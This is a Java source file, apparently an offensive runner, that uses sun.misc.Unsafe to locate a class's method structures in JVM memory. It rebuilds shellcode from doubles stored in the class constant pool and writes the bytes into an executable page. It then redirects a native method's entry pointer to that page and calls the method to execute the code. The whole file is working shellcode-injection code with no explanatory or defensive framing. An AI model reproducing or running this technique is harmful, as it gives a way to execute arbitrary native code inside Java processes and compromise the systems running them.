package ghp.runner;

import sun.misc.SharedSecrets;
import sun.misc.Unsafe;

import java.nio.ByteBuffer;

public class Done {
    @PlatformVariable("oopSize")
    static int oopSize;
    @PlatformVariable("methodSize")
    static long _native_entry;
    @PlatformVariable("klassOffset")
    static long _klass_offset;
    @PlatformVariable("heapField")
    static long _heap_offset;
    @PlatformVariable("virtualSpaceMin")
    static int virtualSpaceMin;
    @PlatformVariable("methods")
    static long _methods;
    @PlatformVariable("methodsData")
    static long _methods_data;
    @PlatformVariable("shellcodeLength")
    static int shellcodeLength;

    public static void main(String[] args) {
        Unsafe unsafe;
        try {
            java.lang.reflect.Field f = Unsafe.class.getDeclaredField("theUnsafe");
            f.setAccessible(true);
            unsafe = (Unsafe) f.get(null);
        } catch (Exception e) {
            throw new RuntimeException("Unable to get Unsafe", e);
        }


        long classAddress = unsafe.getLong(Done.class, unsafe.getInt(_klass_offset));
        long methodAddress = unsafe.getAddress(
                unsafe.getAddress(classAddress + _methods) + _methods_data
                        + (long) 2 * oopSize);

        long nativePtrTarget = unsafe.getAddress(_heap_offset + virtualSpaceMin);

       // System.out.printf("Class address: %16X%n", classAddress);
       // System.out.printf("ERW page: %16X%n", nativePtrTarget);

        byte[] shell = new byte[shellcodeLength * 8];
        for (int i = 0; i < shellcodeLength; i++) {
            ByteBuffer.wrap(shell, i * 8, 8).putDouble(
                    SharedSecrets.getJavaLangAccess().getConstantPool(Done.class).getDoubleAt(i * 2 + 1)
            );
        }

        for (int i = 0; i < shell.length; i++) {
            unsafe.putByte(nativePtrTarget + i, shell[i]);
        }

        //  System.out.println("Putting...");
        unsafe.putAddress(methodAddress + _native_entry, nativePtrTarget);
        //  System.out.println("Exec'n...");

        nativer();
    }

    /*
    public static int getPid() throws Exception {
        java.lang.management.RuntimeMXBean runtime =
                java.lang.management.ManagementFactory.getRuntimeMXBean();
        java.lang.reflect.Field jvm = runtime.getClass().getDeclaredField("jvm");
        jvm.setAccessible(true);
        sun.management.VMManagement mgmt =
                (sun.management.VMManagement) jvm.get(runtime);
        java.lang.reflect.Method pid_method =
                mgmt.getClass().getDeclaredMethod("getProcessId");
        pid_method.setAccessible(true);

        int pid = (Integer) pid_method.invoke(mgmt);
        return pid;
    }
     */
    private static native void nativer();
}
